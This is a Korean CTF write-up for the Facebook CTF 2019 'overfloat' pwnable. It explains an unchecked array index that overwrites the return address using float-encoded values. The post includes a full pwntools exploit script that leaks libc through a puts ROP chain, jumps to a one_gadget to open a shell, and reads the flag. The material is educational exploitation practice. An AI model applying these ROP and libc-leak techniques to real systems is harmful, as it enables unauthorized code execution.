+++
title = "Facebook CTF 2019 Pwnable Overfloat Writeup"
subtitle = "overfloat writeup"

# Add a summary to display on homepage (optional).
summary = "overfloat writeup"

date = "2019-06-01T21:47:09+09:00"
publishDate = "2019-06-01T21:47:09+09:00"
expiryDate = ""

# Authors. Comma separated list, e.g. `["Bob Smith", "David Jones"]`.
authors = []

# Tags and categories
# For example, use `tags = []` for no tags, or the form `tags = ["A Tag", "Another Tag"]` for one or more tags.
tags = ["CTF", "2019", "fbctf", "facebook"]
categories = ["CTF"]
keywords = ["CTF", "2019", "fbctf", "facebook"]

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["deep-learning"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
# projects = ["internal-project"]

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
[image]
  # Caption (optional)
  caption = ""

  # Focal point (optional)
  # Options: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight
  focal_point = ""

draft = false
+++

Facebook CTF 2019 Pwnable Overfloat Writeup

# 목차
1. [요약](#요약)
2. [분석 대상](#분석-대상)
1. [공격 벡터 찾기](#공격-벡터-찾기)
3. [익스 코드](#익스-코드)
4. [시나리오](#시나리오)

{{< figure width="500px" src="https://user-images.githubusercontent.com/19237789/58782227-f50b3400-8618-11e9-8c19-7f77e29d391e.png" alt="description" >}}

# 요약
---
`#CWE-129`, `#CWE-787`, `#CWE-788`, `#ROP`, `#chaining`

이번 문제는 overflow + float을 합성한 overfloat 이란 문제이며
일반적인 버퍼 오버플로가 아니라
float형으로 메모리에 저장한다는 특징을 갖는다.
float형을 입력받아서 메모리에 차곡차곡 저장하는데 무한 반복문에 의해서 리턴 주소(RET)까지 덮어서 ROP 공격이 가능합니다.
단, 메모리에 float형으로 저장된다는 것만 유의하면 됩니다.

CWE-129: 검증되지 않은 배열 인덱스의 사용  
CWE-787: Out-of-bounds 쓰기  
CWE-788: 할당된 버퍼 크기를 넘어선 메모리의 쓰기

# 분석 대상
---
{{< highlight shell >}}
# md5sum overfloat* libc-2.27.so
b2e922b5a36288d9deedd76beb34f417  overfloat
72c884e14c2cbce04b1f9f8ed7b2f3df  overfloat.tar.gz
50390b2ae8aaa73c47745040f54e602f  libc-2.27.so

# file overfloat libc-2.27.so
overfloat:    ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
libc-2.27.so: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0, for GNU/Linux 3.2.0, stripped
{{< /highlight >}}

# 공격 벡터 찾기
---
{{< highlight c "linenos=table,nobackground=true" >}}
__int64 __fastcall chart_course(__int64 a1)
{
  __int64 result; // rax@6
  int v2; // xmm1_4@8
  char s; // [sp+10h] [bp-70h]@5
  int v4; // [sp+78h] [bp-8h]@8
  int i; // [sp+7Ch] [bp-4h]@1

  for ( i = 0; ; ++i )
  {
    if ( i & 1 )
      printf("LON[%d]: ", (unsigned int)(i / 2 % 10));
    else
      printf("LAT[%d]: ", (unsigned int)(i / 2 % 10));
    fgets(&s, 0x64, stdin);
    if ( !strncmp(&s, "done", 4uLL) )
      break;
    *(float *)&v2 = atof(&s);
    v4 = v2;
    memset(&s, 0, 0x64uLL);
    *(_DWORD *)(4LL * i + a1) = v4;
LABEL_9:
    ;
  }
  result = i & 1;
  if ( i & 1 )
  {
    puts("WHERES THE LONGITUDE?");
    --i;
    goto LABEL_9;
  }
  return result;
}
{{< /highlight >}}
위 함수는 주어진 바이너리 overfloat의 사용자 정의 함수 chart_course입니다.
유일하게 입력할 수 있는 곳은 지역변수 s밖에 없으므로 공격 벡터는 지역변수 s입니다.

chart_course 함수는 입력 데이터를 string형으로 받아서 float형으로 변환한 다음 a1에 배열로 접근해서 값을 저장합니다.
반복문이 무한히 돌기 때문에 a1[i++]로 리턴 주소(RET)까지 덮을 수 있죠.

# 시나리오
---
공격 벡터를 알았으면 이제 어떻게 익스를 할 것인지 시나리오를 생각해야 하는데요.
무한 반복문 덕분에 RET와 그 넘어서 RET+8, RET+0x10, ... 을 덮어씌울 수 있으니까 chaining 기법을 사용할 수 있겠군요!

그럼 chaining으로 어떤 작업을 해야 할까요?
pwnable의 최종 목표는 쉘을 따서 flag를 cat으로 읽어오는 것입니다.
그럼 쉘을 따는 작업을 해야겠죠?
마침 문제 출제자가 libc-2.27.so 라이브러리를 제공해주었습니다.
즉 라이브러리로 쉘을 따라는 건데요.
라이브러리를 이용하기 위해서는 **라이브러리 leak**을 먼저 해줘야 합니다.

leak에 이용할 수 있을만한 출력 함수가 무엇이 있는지 찾아볼까요? 다음은 .got 영역입니다.
{{< figure src="https://user-images.githubusercontent.com/19237789/58784594-c2fcd080-861e-11e9-829f-84ddbd2d193c.png" alt=".got.plt" >}}
puts, printf가 있네요.
둘 중 아무거나 써도 될 거 같아요.
저는 puts를 썼어요.

{{< highlight python >}}
>>> overfloat = ELF('./overfloat')
>>> hex(overfloat.plt.puts)
'0x400690'
{{< /highlight >}}

그리고 puts의 매개변수로 무얼 넘겨야 할까요?
바로 라이브러리의 주소가 나올만한 것들이겠죠?
.got 영역에 있는 함수나 _IO_2_1_stdin\_를 매개변수로 넘기면 라이브러리 주소인 0x7fxxxxxxxxxx가 출력될 것입니다.
저는 _IO_2_1_stdin\_를 puts의 매개변수로 잡았습니다.

{{< highlight python >}}
>>> libc = ELF('./libc-2.27.so')
>>> hex(libc.sym._IO_2_1_stdin_)
'0x3eba00'
{{< /highlight >}}

_IO_2_1_stdin\_의 주소를 보니 0x00으로 끝나는 것을 주의해주세요!
문자열 출력을 위해서 stdin@GLIBC_2_2_5 +1을 해줘야만 해요.

{{< highlight python >}}
>>> hex(overfloat.got.stdin + 1)
'0x602091'
{{< /highlight >}}

여기까지가 _IO_2_1_stdin\_을 출력하기 위해 필요한 가젯(Gadget)을 모은 것입니다.
오우! 한가지 빼먹은 것이 있었네요.
이번 바이너리는 64비트 ELF입니다.
함수 호출 규약 fastcall에서는 함수의 첫 번째 매개변수를 전달하는 방식이 rdi 레지스터를 이용한다는 것입니다.
간단히 pwntools로 가젯을 모았어요.

{{< highlight python >}}
>>> rop = ROP(overfloat)
>>> hex(rop.rdi.address)
'0x400a83'
{{< /highlight >}}

이제야 _IO_2_1_stdin\_을 출력하기 위해 필요한 가젯을 다 모았군요.
일반적인 페이로드라면 다음과 같았겠죠.

{{< highlight python >}}
payload = ''
payload += p64(rop.rdi.address)
payload += p64(overfloat.got.stdin + 1)
payload += p64(overfloat.plt.puts)
{{< /highlight >}}

하지만 overfloat 바이너리는 float형으로 메모리를 덮는다는 사실!

{{< highlight c >}}
    *(float *)&v2 = atof(&s);
    v4 = v2;
    memset(&s, 0, 0x64uLL);
    *(_DWORD *)(4LL * i + a1) = v4;
{{< /highlight >}}

위 코드의 atof 함수가 바로 그 녀석이죠.
그럼 저희는 모았던 가젯을 float형으로 변환해야 합니다.

{{< highlight python >}}
>>> u = lambda x: str(struct.unpack('<f', p32(x))[0])
>>> u(rop.rdi.address)
'5.88124264828e-39'
>>> u(overfloat.got.stdin + 1)
'8.82789025646e-39'
>>> u(overfloat.plt.puts)
'5.87982593553e-39'
{{< /highlight >}}

위와 같이 변환해서 보내게 되면 메모리에는 우리가 원하는 가젯의 주소가 들어가게 될 것입니다.

{{< highlight python >}}
r.sendlineafter(': ', u(rop.rdi.address))
r.sendlineafter(': ', '0')
r.sendlineafter(': ', u(overfloat.got.stdin + 1))
r.sendlineafter(': ', '0')
r.sendlineafter(': ', u(overfloat.plt.puts))
r.sendlineafter(': ', '0')
{{< /highlight >}}


# 익스 코드
---
{{< highlight python >}}
from pwn import *

u = lambda x: str(struct.unpack('<f', p32(x))[0])

overfloat = ELF('./overfloat', False)
libc = ELF('./libc-2.27.so', False)
rop = ROP(overfloat)

r = remote('challenges.fbctf.com', 1341)

p = log.progress('')
for _ in range(14):
    p.status(str(_))
    r.sendlineafter(': ', str(_))

p.status('pop rdi ; ret')
r.sendlineafter(': ', u(rop.rdi.address))
r.sendlineafter(': ', '0')

p.status('stdin@got + 1')
r.sendlineafter(': ', u(overfloat.got.stdin + 1))
r.sendlineafter(': ', '0')

p.status('puts@plt')
r.sendlineafter(': ', u(overfloat.plt.puts))
r.sendlineafter(': ', '0')

p.status('main@.text')
r.sendlineafter(': ', u(overfloat.sym.main))
r.sendlineafter(': ', '0')

p.status('1st done')
r.sendlineafter(': ', 'done')
r.recvuntil('\n')

p.status('libc leak')
LEAK = '\0'+r.recvuntil('\n')[:-1]
LEAK = LEAK.ljust(8, '\0')
LEAK = u64(LEAK)
libc.address = LEAK - libc.sym._IO_2_1_stdin_
log.info('libc: {:#x}'.format(libc.address))

for _ in range(14):
    p.status(str(_))
    r.sendlineafter(': ', str(_))

p.status('one_gadget')
one_gadget = libc.address + 0x4f2c5
r.sendlineafter(': ', u(one_gadget & 0xffffffff))
r.sendlineafter(': ', u(one_gadget >> 32))

p.status('2nd done')
r.sendlineafter(': ', 'done')
r.sendlineafter('\n', 'cat /home/overfloat/flag')
p.success()
r.interactive()
{{< /highlight >}}

참고  
Online Converter : https://www.binaryconvert.com/convert_float.html  
Python Converting Code : https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362  
Python2 struct module : https://docs.python.org/2/library/struct.html  
Python3 struct module : https://docs.python.org/3/library/struct.html
